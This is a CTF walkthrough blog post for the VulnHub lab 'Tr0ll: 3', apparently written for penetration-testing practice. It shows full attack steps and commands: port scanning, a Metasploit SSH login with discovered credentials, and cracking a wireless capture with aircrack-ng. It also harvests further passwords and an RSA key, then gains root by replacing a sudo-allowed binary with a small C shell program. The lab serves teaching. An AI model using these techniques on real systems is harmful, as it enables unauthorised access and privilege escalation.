<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Tr0ll: 3 Vulnhub Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/tr0ll-3-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2019-08-13T08:18:52+00:00">August 13, 2019</time><time class="updated" datetime="2025-06-10T20:11:22+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Today we are going to solve another CTF challenge called “Tr0ll: 3” which is a part of Tr0ll series. It is available on Vulnhub for the purpose of online penetration practices. This lab is not that difficult if we have the proper basic knowledge of Penetration Testing. This credit of making this lab goes to <a style="color: #000000;" href="https://www.vulnhub.com/author/maleus,94/">Maleus</a>. Let’s start and learn how to successfully breach it.</span></p>
<p><span style="color: #000000;">Level: Intermediate</span></p>
<p><span style="color: #000000;">Since these labs are available on the Vulnhub Website. We will be downloading the .ova file from this <strong><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.vulnhub.com/entry/tr0ll-3,340/">link</a></span></strong>.</span></p>
<h3><span style="color: #800000;">Penetration Testing Methodology</span></h3>
<ul>
<li><span style="color: #000000;">Scanning</span></li>
<li><span style="color: #000000;">Enumeration</span></li>
<li><span style="color: #000000;">Exploiting</span></li>
<li><span style="color: #000000;">Post Enumeration &amp; Exploitation</span></li>
<li><span style="color: #000000;">Privilege Escalation</span></li>
<li><span style="color: #000000;">Capture the flag</span></li>
</ul>
<p><span style="text-decoration: underline; color: #000000;"><strong>Walkthrough </strong></span></p>
<h3><span style="color: #800000;">Scanning</span></h3>
<p><span style="color: #000000;">We will be running this lab in a Virtual Machine Player or Virtual Box.  After running the lab, we used the netdiscover command to check the IP Address of the lab. </span></p>
<pre class="lang:default decode:true">netdiscover</pre>
<p><span style="color: #000000;">This was found out to be 192.168.1.104.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-NsCN0SFs9CQ/XVJtuzAe4MI/AAAAAAAAf_8/2pGZpibwYRInUrU6uhw9j2K6r2Dx-6_rACLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">Now we will run an aggressive scan using nmap for proceed further. </span></p>
<pre class="lang:default decode:true">nmap -A 192.168.1.104</pre>
<p><span style="color: #000000;">From its result, I found only port 22 was open for ssh.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-gRWdfE6HRr4/XVJtyBFtT6I/AAAAAAAAgAk/fkMH0w9AQ54ZS4PU1rnBg1MRZp0eFh31ACLcBGAs/s1600/2.png"/></p>
<h3><span style="color: #800000;">Enumeration</span></h3>
<p><span style="color: #000000;"><em>Note: when the host machine will turn power, you will notice login: <strong>start:here</strong> which might be helpful in ssh login.</em></span></p>
<pre class="lang:default decode:true">start:here</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-vKGHkl7lA6o/XVJtyVhTbMI/AAAAAAAAgAo/dX4qMKw2UbIIcmvwMb56qhCfcLePAiUNgCLcBGAs/s1600/3.png"/></p>
<h3><span style="color: #800000;">Exploiting</span></h3>
<p><span style="color: #000000;">Assuming above enumerated credential could be useful for taking access of host machine thus we will use Metasploit for login into ssh.</span></p>
<pre class="lang:default decode:true">msf5&gt; use auxiliary/scanner/ssh/ssh_login
msf5 auxiliary(scanner/ssh/ssh_login) &gt; set rhosts 192.168.1.104
msf5 auxiliary(scanner/ssh/ssh_login) &gt; set username start
msf5 auxiliary(scanner/ssh/ssh_login) &gt; set password here
msf5 auxiliary(scanner/ssh/ssh_login) &gt; exploit
</pre>
<p><span style="color: #000000;">By executing the above command we have initially compromised the host machine as now we have access of remote shell. Therefore further we will try to upload “<em>LinEnum.sh script”</em> for post enumeration.</span></p>
<pre class="lang:default decode:true">meterpreter &gt; cd /tmp 
meterpreter &gt; upload /root/LinEnum.sh 
meterpreter &gt; shell python -c 'import pty;pty.spawn("/bin/bash")' 
chmod 777 LinEnum.sh 
./LinEnum.sh</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-PZpQc97kEFs/XVJtyqAJBZI/AAAAAAAAgAs/l_7PxmbhdOkewTkK-iga9yh-jX866reuQCLcBGAs/s1600/4.png"/></p>
<h3><span style="color: #800000;">Post Enumeration &amp; Exploitation</span></h3>
<p><span style="color: #000000;">But LinEnum couldn’t help and thus we tried to enumerate writable file that have ALL permissions “0777” using the find command as given below. </span></p>
<pre class="lang:default decode:true ">find / -type f -perm 0777 2&gt;dev/null</pre>
<p><span style="color: #000000;">And we found two interesting file one was a “.cap file”  <em>(wytshadow.cap)</em> and other was “text file” <em>(gold_star.txt)</em>. So, we download these files using the meterpreter as given below.</span></p>
<pre class="lang:default decode:true">meterpreter &gt; cd /var/log/.dist-manage
meterpreter &gt; ls
meterpreter &gt; download wytshadow.cap /root/Desktop
meterpreter &gt; cd /.hints/lol/rofl/roflmao/this/isnt/gonna/stop/anytime/soon/still/going/lol/annoyed/almost/there/jk/no/seriously/last/one/rofl/ok/ill/stop/however/this/is/fun/ok/here/rofl/sorry/you/made/it
meterpreter &gt; download gold_star.txt /root/Desktop/</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-rtVxSABO8Sk/XVJty97Yx_I/AAAAAAAAgAw/Y1NPb8g21z0Pb_-a67H-kre_3tOCag-uwCLcBGAs/s1600/5.png"/></p>
<p><span style="color: #000000;">As we have the .cap file, It can be opened with Wireshark, and we found that all the packets have the Protocol marked as “802.11” and captured traffic looks like wireless network packet because as we all know 802.11 is the protocol used for transmission of the packet between wireless connected devices.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-GSK6mF1cRH0/XVJtzUcBf0I/AAAAAAAAgA0/iJ-AkKDYx60mr-qqwIYcjYs5dXLjwcxjwCLcBGAs/s1600/6.png"/></p>
<p><span style="color: #000000;">Hmm!! Here aircrack-ng might be helpful for us in extracting the password. And here we can use <em>gold_star.txt</em> file along with  wytshadow.cap  as shown in the image given below.</span></p>
<pre class="lang:default decode:true">aircrack-ng -w gold_star.txt wytshadow.cap</pre>
<p><span style="color: #000000;">Great!! The aircrack-ng gave us the password <strong>gaUoCe34t1</strong>.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-Vh_RU_bOJ40/XVJtzop2BNI/AAAAAAAAgA4/mLbVhHUVix08yPe6J2_Cbc3f_OMuoIwZgCLcBGAs/s1600/7.png"/></p>
<p><span style="color: #000000;">As we have obtained the password therefore we switch into another the account say “wytshadow’s account” using credential- <em><strong>wytshadow:</strong><strong>gaUoCe34t1</strong></em></span></p>
<pre class="lang:default decode:true">su wytshadow</pre>
<p><span style="color: #000000;">After successfully logging in, we checked the directories and file list of “/” directory and notice a file named as “ohhfun” having SUID bit thus it has permission to run as root. </span></p>
<p><span style="color: #000000;">With this in mind, we ran the file as shown in the given figure. Here you can see that it is pointing toward the LYNX by executing a text message continuously. </span></p>
<pre class="lang:default decode:true">cd 
ls -al 
./oohfun</pre>
<p><span style="color: #000000;">Lynx is a command-line browser and maybe it will have to do something further.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-a9UkvT0AmMQ/XVJtz3UMnfI/AAAAAAAAgA8/Y4x4ALPvt0YnXtBWRwc5BDDiQQMnKvjRACLcBGAs/s1600/8.png"/></p>
<p><span style="color: #000000;">Then with looked for sudo rights for Wytshadow and saw that nginx is available to run as root.</span></p>
<pre class="lang:default decode:true">sudo -l</pre>
<p><span style="color: #000000;">We traversed into the nginx directory and open its config file “sites-enabled sites” file. We see that we have the user agent as Lynx which is listening on 8080. </span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-g7_em723ayk/XVJt0A7wPzI/AAAAAAAAgBA/5kkjCUDJoXMo9CE5UsIBZFZzPPoJhl81gCLcBGAs/s1600/9.png"/></p>
<p><span style="color: #000000;">Further, we started the nginx service as shown in the given image. Using the netstat command we saw port 8080 opened. This was not opened when we attempted the nmap scan.</span></p>
<pre class="lang:default decode:true">sudo /usr/sbin/service nginx start
netstat -antp</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-0EGEBf8-R9w/XVJtuzrimcI/AAAAAAAAgAA/hjxHriQClzYejIHUcTllLUVRN8f698GpACLcBGAs/s1600/10.png"/></p>
<p><span style="color: #000000;">As discussed earlier, we are going to install a lynx browser in our local machine. We are going to open the page associated to port we just opened.</span></p>
<pre class="lang:default decode:true">apt install lynx
lynx http://192.168.1.104:8080</pre>
<p>8<img decoding="async" src="https://1.bp.blogspot.com/-0dACsz-Re7Y/XVJtuyrLcAI/AAAAAAAAgAE/xGymKo-FkckopuRn6EWb3bBDHuROC08pgCLcBGAs/s1600/11.png"/></p>
<p><span style="color: #000000;">On opening the link given on the page through lynx, we find these login credentials. That’s was not that difficult. Was it?</span></p>
<p><span style="color: #000000;">Credentials Found:</span></p>
<pre class="lang:default decode:true">Username: genphlux
Password:  HF9nd0cr!</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-Hz-HX7WkGHQ/XVJtvnJji4I/AAAAAAAAgAI/lMAISuYja6wI5ytoTEoGRwrJJmffNILXQCLcBGAs/s1600/12.png"/></p>
<p><span style="color: #000000;">As we have one more credential let’s switch into genphlux’s user using above enumerated cred.</span></p>
<pre class="lang:default decode:true">su genphulx</pre>
<p><span style="color: #000000;">After logging in, we found a file named maleus as shown in the given image and by exploring this file we saw it stores RSA key.</span></p>
<pre class="lang:default decode:true">cd 
ls -al 
file maleus 
cat maleus</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-bLn_iCG8X4w/XVJtwPmVRyI/AAAAAAAAgAM/Vn2oh3pMqCQ-VxYN7L6XpE-6eRX7ItH5gCLcBGAs/s1600/13.png"/></p>
<p><span style="color: #000000;">Thus we copied the RSA key in a text file, named as “key” and assign permission 600 that to be accessed by the specific user only.</span></p>
<pre class="lang:default decode:true">chmod 600 key
ssh maleus@192.168.1.104 -i key</pre>
<p><span style="color: #000000;">After successfully logging in, we found a file named “don’t_even_bother” that has full permissions and with the help of file we identify its type, it came out to be ELF 64-bit moreover we found another file “.viminfo” file in the same directory.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-3Kca1tzQRnc/XVJtwxv9sJI/AAAAAAAAgAQ/anNdHMyQ5J47EAW5ahmsVc0VRuLBpc8UQCLcBGAs/s1600/14.png"/></p>
<p><span style="color: #000000;">further, we used the cat command to inspect the viminfo file. On close inspection, we found a password for another user “B^slc8I$”. This is a good discovery.</span></p>
<pre class="lang:default decode:true">cat .viminfo</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-JVqleTOTriw/XVJtxLjdXbI/AAAAAAAAgAU/GrCOHR7fGhQxnjzpVSlvlCWWgOAh8itOACLcBGAs/s1600/15.png"/></p>
<h3><span style="color: #800000;">Privilege Escalation</span></h3>
<p><span style="color: #000000;">Now that we have the password, let’s identify the sudo rights for maleus. </span></p>
<pre class="lang:default decode:true">sudo -l</pre>
<p><span style="color: #000000;"> After running the following command, we find that maleus can run don’t_even_bother file as root. So in order to escalate privilege on this machine, we are going to use this file for injecting our malicious code. Let’s first, empty the contents of this file using echo and edit it using nano command.</span></p>
<pre class="lang:default decode:true">echo "" &gt; dont_even_bother
nano dont_even_bother.c</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-vhrWLUZUttE/XVJtxZh5nRI/AAAAAAAAgAY/sGUgpT7X6007h1q6Z6tGdwLEwLAikRgHQCLcBGAs/s1600/16.png"/></p>
<p><span style="color: #000000;">Now, after opening this file, we wrote this small .C script which will invoke a shell on executing after its compilations.</span></p>
<pre class="lang:default decode:true ">int main (void){
       setresuid(0, 0, 0);
       system("/bin/sh");
}</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-L4UxDXZylhc/XVJtxVJfMhI/AAAAAAAAgAc/66autpq4HAkZh-Z3RZdLbzKAB2gX_0-kwCLcBGAs/s1600/17.png"/></p>
<p><span style="color: #000000;">Now, we as it is “.c” file, we will have to compile it using the gcc compiler and then execute it along sudo permissions.</span></p>
<pre class="lang:default decode:true">gcc dont_even_bother.c -o dont_even_bother
sudo /home/maleus/dont_even_bother</pre>
<p><span style="color: #000000;">Yuppieee!! we root it successfully, Let’s capture the final flag.</span></p>
<pre class="lang:default decode:true">id 
cd /root 
ls 
cat flag.txt</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-DSK13x6i6Pw/XVJtx3rAbUI/AAAAAAAAgAg/v2d1lszAf2IOzlHPl3a9MNgvkVl9qRuUwCLcBGAs/s1600/18.png"/></p>
<p><span style="color: #000000;"><strong>A<span style="color: #000000;">uthor: Pavandeep Singh</span></strong> is a Technical Writer, Researcher and Penetration Tester Contact</span> <a href="https://www.linkedin.com/in/pavandeep-singh-6b1074132"><strong>here</strong></a></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
